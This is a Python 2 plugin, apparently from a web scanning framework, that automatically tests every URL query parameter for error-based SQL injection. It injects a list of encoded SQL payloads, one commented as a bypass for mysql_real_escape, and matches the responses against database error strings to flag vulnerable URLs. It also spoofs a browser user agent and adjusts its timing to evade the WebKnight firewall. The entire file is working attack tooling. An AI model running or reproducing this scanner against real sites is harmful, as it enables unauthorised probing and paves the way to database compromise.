# Ugly error based Sqli plugin port original by @Zigoo0 ported by @asim_jaweesh

import signal
import socket
from datetime import datetime
import multiprocessing as multip
import errno
import time

import re
import urllib
from urllib import FancyURLopener

class UserAgent(FancyURLopener):
    version = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/99.0'

useragent = UserAgent()


app = None

options = { }




def main_function(url, payloads, check):
    #This function is going to split the url and try the append paylods in every parameter value.
    opener = urllib.urlopen(url)
    vuln = 0
    if str(5) in str(opener.code):
        app.print_line("Server Error!")
    if opener.code == 999:
        # Detetcing the WebKnight WAF from the StatusCode.
        app.print_line("[~] WebKnight WAF Detected!")
        app.print_line("[~] Delaying 3 seconds between every request")
        time.sleep(3)
    for params in url.split("?")[1].split("&"):
        for payload in payloads:
            bugs = url.replace(params, params + str(payload).strip())
            request = useragent.open(bugs)
            html = request.readlines()
            for line in html:
                checker = re.findall(check, line)
                if len(checker) != 0:
                    app.print_line("[*] Bingo! Vulnerable url: %s " % bugs)
                    vurl = url.split('/')[2]
                    # TODO: insert into the database
                    #app.db.host.add(app.db.get_session(), hid=vurl,url=bugs,vuln='Yes',pay=str(payload).strip())
                    vuln += 1


    if vuln == 0:
        app.print_line("[!] Target is not vulnerable!")

def error_based_sqli_func(url):
    # Payload = 12345'"\'\");|]*{%0d%0a<%00>%bf%27'  Yeaa let's bug the query :D :D
    # added chinese char to the SQLI payloads to bypass mysql_real_escape_*
    payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
    check = re.compile("Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
    main_function(url, payloads, check)




def do_test(args):
    print "running with: %s" % args
    def init_work(*_):
        signal.signal(signal.SIGINT, signal.SIG_IGN)

    pool = multip.Pool(processes=5, initializer=init_work)
    jobs = []
    #
    try:
        j = pool.apply_async(error_based_sqli_func, (args,))
        jobs.append(j)
        for j in jobs:
            j.get()
    except KeyboardInterrupt:
        pool.terminate()
        pool.join()
    else:
        pool.close()
        pool.join()
